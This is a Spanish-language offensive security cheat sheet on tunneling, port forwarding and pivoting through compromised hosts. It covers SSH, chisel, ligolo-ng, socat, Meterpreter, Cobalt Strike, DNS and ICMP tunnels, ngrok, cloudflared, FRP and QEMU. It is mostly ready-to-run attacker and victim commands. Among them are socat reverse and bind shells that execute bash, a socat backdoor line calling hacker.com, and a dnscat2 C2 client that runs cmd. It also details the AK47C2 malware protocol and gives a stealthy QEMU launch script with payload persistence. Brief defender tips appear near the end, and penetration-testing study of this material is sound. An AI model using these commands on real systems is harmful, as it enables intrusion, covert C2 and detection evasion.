# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Consejo de Nmap

> [!WARNING]
> **ICMP** y **SYN** scans no se pueden tunelizar a través de socks proxies, por lo que debemos **desactivar el descubrimiento por ping** (`-Pn`) y especificar **escaneos TCP** (`-sT`) para que esto funcione.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Conexión gráfica SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Abrir un nuevo Port en SSH Server --> Otro Port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Puerto local --> Host comprometido (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Local Port --> host comprometido (SSH) --> Donde sea
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Esto es útil para conseguir reverse shells desde internal hosts a través de una DMZ hacia tu host:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Necesitas **root en ambos dispositivos** (ya que vas a crear nuevas interfaces) y la configuración de sshd tiene que permitir root login:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Habilitar forwarding en el lado del Server
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Establecer una nueva ruta en el lado del cliente
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> El ataque de degradación Terrapin de 2023 puede permitir a un man-in-the-middle manipular el early SSH handshake e inyectar datos en **any forwarded channel** ( `-L`, `-R`, `-D` ). Asegúrate de que tanto el cliente como el servidor estén parcheados (**OpenSSH ≥ 9.6/LibreSSH 6.7**) o desactiva explícitamente los algoritmos vulnerables `chacha20-poly1305@openssh.com` y `*-etm@openssh.com` en `sshd_config`/`ssh_config` antes de confiar en SSH tunnels.

## SSHUTTLE

Puedes enrutar mediante **ssh** todo el **tráfico** hacia una **subred** a través de un host.\
Por ejemplo, reenviando todo el tráfico que tenga como destino 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Conectar con una clave privada
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Puerto local --> Host comprometido (sesión activa) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Otra forma:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Abre un puerto en el teamserver escuchando en todas las interfaces que pueda usarse para **encaminar el tráfico a través del beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> En este caso, el **port se abre en el beacon host**, no en el Team Server y el tráfico se envía al Team Server y desde allí al host:port indicado.
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
A tener en cuenta:

- Beacon's reverse port forward está diseñado para **tunelizar el tráfico al Team Server, no para retransmitir entre máquinas individuales**.
- El tráfico se **tuneliza dentro del Beacon's C2 traffic**, incluyendo enlaces P2P.
- **Admin privileges are not required** para crear reverse port forwards en high ports.

### rPort2Port local

> [!WARNING]
> En este caso, el **puerto se abre en el beacon host**, no en el Team Server y el **tráfico se envía al Cobalt Strike client** (no al Team Server) y desde allí al host:port indicado
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Necesitas subir un archivo de túnel web: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Puedes descargarlo desde la página de releases de [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Necesitas usar la **misma versión para client y server**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Usa la misma versión para agent y proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Vinculación y escucha del agente
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Acceder a los puertos locales del agente
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. El túnel se inicia desde la víctima.\
Se crea un socks4 proxy en 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot a través de **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port a través de socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter a través de SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Puedes evadir un **non-authenticated proxy** ejecutando esta línea en lugar de la última en la consola de la víctima:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Crear certificados en ambos lados: Client y Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Conectar el puerto SSH local (22) al puerto 443 del host atacante
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Es como una versión de consola de PuTTY (las opciones son muy similares a las de un cliente ssh).

Como este binario se ejecutará en la victim y es un cliente ssh, necesitamos abrir nuestro servicio ssh y el port para poder tener una reverse connection. Luego, para forward solo un locally accessible port a un port en nuestra machine:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Necesitas ser local admin (para cualquier puerto)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Necesitas tener **acceso RDP al sistema**.\
Descarga:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta usa `Dynamic Virtual Channels` (`DVC`) de la característica Remote Desktop Service de Windows. DVC se encarga de **tunelizar paquetes sobre la conexión RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

En el equipo cliente, carga **`SocksOverRDP-Plugin.dll`** de la siguiente manera:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Ahora podemos **connect** con la **victim** a través de **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **prompt** que indique que el **SocksOverRDP plugin is enabled**, y que estará **listen** en **127.0.0.1:1080**.

**Connect** vía **RDP** y sube y ejecuta en la máquina **victim** el binario `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Ahora, confirma en tu máquina (attacker) que el puerto 1080 está escuchando:
```
netstat -antb | findstr 1080
```
Ahora puedes usar [**Proxifier**](https://www.proxifier.com/) **para enrutar el tráfico a través de ese puerto.**

## Proxificar aplicaciones GUI de Windows

Puedes hacer que las aplicaciones GUI de Windows naveguen a través de un proxy usando [**Proxifier**](https://www.proxifier.com/).\
En **Profile -> Proxy Servers** añade la IP y el puerto del servidor SOCKS.\
En **Profile -> Proxification Rules** añade el nombre del programa a proxificar y las conexiones a las IPs que quieras proxificar.

## NTLM proxy bypass

La herramienta mencionada anteriormente: **Rpivot**\
**OpenVPN** también puede saltarlo, configurando estas opciones en el archivo de configuración:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Se autentica contra un proxy y enlaza un port local que se reenvía al servicio externo que especifiques. Entonces, puedes usar la herramienta de tu elección a través de este port.\
Por ejemplo, reenvía el port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Ahora, si configuras, por ejemplo, en la víctima el servicio **SSH** para que escuche en el puerto 443. Puedes conectarte a él a través del puerto 2222 del atacante.\
También podrías usar un **meterpreter** que se conecte a localhost:443 y el atacante esté escuchando en el puerto 2222.

## YARP

Un proxy inverso creado por Microsoft. Puedes encontrarlo aquí: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## Túnel DNS

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Se necesita root en ambos sistemas para crear adaptadores tun y tunelar datos entre ellos usando consultas DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
El túnel será muy lento. Puedes crear una conexión SSH comprimida a través de este túnel utilizando:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.

Establece un canal C\&C a través de DNS. No necesita privilegios de root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **En PowerShell**

Puedes usar [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) para ejecutar un cliente dnscat2 en PowerShell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding con dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Change proxychains DNS

Proxychains intercepts `gethostbyname` libc call and tunnels tcp DNS request through the socks proxy. By **default** the **DNS** server that proxychains use is **4.2.2.2** (hardcoded). To change it, edit the file: _/usr/lib/proxychains3/proxyresolv_ and change the IP. If you are in a **Windows environment** you could set the IP of the **domain controller**.

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

The Storm-2603 actor created a **dual-channel C2 ("AK47C2")** that abuses *only* outbound **DNS** and **plain HTTP POST** traffic – two protocols that are rarely blocked on corporate networks.

1. **DNS mode (AK47DNS)**
• Generates a random 5-character SessionID (e.g. `H4T14`).
• Prepends `1` for *task requests* or `2` for *results* and concatenates different fields (flags, SessionID, computer name).
• Each field is **XOR-encrypted with the ASCII key `VHBD@H`**, hex-encoded, and glued together with dots – finally ending with the attacker-controlled domain:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests use `DnsQuery()` for **TXT** (and fallback **MG**) records.
• When the response exceeds 0xFF bytes the backdoor **fragments** the data into 63-byte pieces and inserts the markers:
`s<SessionID>t<TOTAL>p<POS>` so the C2 server can reorder them.

2. **HTTP mode (AK47HTTP)**
• Builds a JSON envelope:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• The whole blob is XOR-`VHBD@H` → hex → sent as the body of a **`POST /`** with header `Content-Type: text/plain`.
• The reply follows the same encoding and the `cmd` field is executed with `cmd.exe /c <command> 2>&1`.

Blue Team notes
• Look for unusual **TXT queries** whose first label is long hexadecimal and always end in one rare domain.
• A constant XOR key followed by ASCII-hex is easy to detect with YARA: `6?56484244?484` (`VHBD@H` in hex).
• For HTTP, flag text/plain POST bodies that are pure hex and multiple of two bytes.

{{#note}}
The entire channel fits inside **standard RFC-compliant queries** and keeps each sub-domain label under 63 bytes, making it stealthy in most DNS logs.
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Root is needed in both systems to create tun adapters and tunnel data between them using ICMP echo requests.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Descárgalo desde aquí**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **es una herramienta para exponer soluciones a Internet con un solo comando.**\
_Las URI de exposición son como:_ **UID.ngrok.io**

### Instalación

- Crear una cuenta: https://ngrok.com/signup
- Descarga del cliente:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Usos básicos

**Documentación:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_También es posible añadir autenticación y TLS, si es necesario._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Exponer archivos con HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_Útil para XSS,SSRF,SSTI ..._\
Directamente desde stdout o en la interfaz HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling internal HTTP service
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml ejemplo de configuración simple

Abre 3 túneles:

- 2 TCP
- 1 HTTP con exposición de archivos estáticos desde /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

El demonio `cloudflared` de Cloudflare puede crear túneles salientes que exponen **servicios TCP/UDP locales** sin requerir reglas de firewall entrantes, usando el edge de Cloudflare como punto de encuentro. Esto es muy útil cuando el firewall de egress solo permite tráfico HTTPS pero las conexiones entrantes están bloqueadas.

### Comando rápido de una sola línea
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Túneles persistentes con DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Inicia el conector:
```bash
cloudflared tunnel run mytunnel
```
Porque todo el tráfico sale del host **outbound over 443**, los Cloudflared tunnels son una forma sencilla de evadir ingress ACLs o NAT boundaries. Ten en cuenta que el binary normalmente se ejecuta con privilegios elevados – usa contenedores o la bandera `--user` cuando sea posible.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) es un reverse-proxy en Go mantenido activamente que soporta **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**. A partir de **v0.53.0 (May 2024)** puede actuar como un **SSH Tunnel Gateway**, por lo que un host objetivo puede iniciar un reverse tunnel usando únicamente el cliente OpenSSH estándar – no se requiere binary adicional.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Usando la nueva pasarela SSH (sin el binario frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
El comando anterior publica el puerto de la víctima **8080** como **attacker_ip:9000** sin desplegar herramientas adicionales – ideal para living-off-the-land pivoting.

## Túneles encubiertos basados en VM con QEMU

La red en modo usuario de QEMU (`-netdev user`) soporta una opción llamada `hostfwd` que **vincula un puerto TCP/UDP en el *host* y lo reenvía al *guest***. Cuando el guest ejecuta un SSH daemon completo, la regla hostfwd te proporciona un SSH jump box desechable que vive completamente dentro de una VM efímera – perfecto para ocultar tráfico C2 frente a EDR porque toda la actividad maliciosa y los archivos permanecen en el disco virtual.

### One-liner rápido
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• El comando anterior lanza una imagen de **Tiny Core Linux** (`tc.qcow2`) en RAM.
• El puerto **2222/tcp** en el Windows host se reenvía de forma transparente a **22/tcp** dentro del guest.
• Desde el punto de vista del atacante, el objetivo simplemente expone el puerto 2222; cualquier paquete que lo alcance es gestionado por el servidor SSH que se ejecuta en la VM.

### Lanzamiento sigiloso mediante VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Ejecutar el script con `cscript.exe //B update.vbs` mantiene la ventana oculta.

### Persistencia dentro del guest

Como Tiny Core es sin estado, los atacantes normalmente:

1. Dejar el payload en `/opt/123.out`
2. Añadir a `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Agregar `home/tc` and `opt` a `/opt/filetool.lst` para que el payload se empaquete en `mydata.tgz` al apagar.

### Por qué esto evade la detección

• Solo dos ejecutables no firmados (`qemu-system-*.exe`) tocan el disco; no se instalan drivers ni servicios.  
• Los productos de seguridad en el host ven **benign loopback traffic** (el C2 real termina dentro de la VM).  
• Los memory scanners nunca analizan el espacio de procesos maliciosos porque vive en un OS diferente.

### Consejos para defensores

• Alertar sobre **unexpected QEMU/VirtualBox/KVM binaries** en rutas con permisos de escritura por parte del usuario.  
• Bloquear conexiones salientes que se originen desde `qemu-system*.exe`.  
• Buscar puertos de escucha raros (2222, 10022, …) que se enlacen inmediatamente después del lanzamiento de QEMU.

---

## Otras herramientas para revisar

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## Referencias

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
